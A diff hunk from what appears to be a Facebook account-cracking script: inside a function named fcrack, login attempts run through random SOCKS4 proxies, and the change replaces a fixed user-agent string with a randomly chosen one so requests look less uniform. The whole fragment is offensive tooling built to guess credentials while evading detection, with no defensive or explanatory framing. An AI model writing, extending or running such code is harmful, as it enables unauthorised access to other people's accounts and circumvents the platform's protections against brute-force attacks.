@@ -953,7 +953,7 @@ def fcrack(uid,pwx,tl):
 			session = requests.Session()
 			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.ZEE\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
-			ua = 'Mozilla/5.0 (Linux; Android 10; Fendy plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]'
+			ua = random.choice(ugen)
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			free_fb = session.get('https://free.facebook.com').text
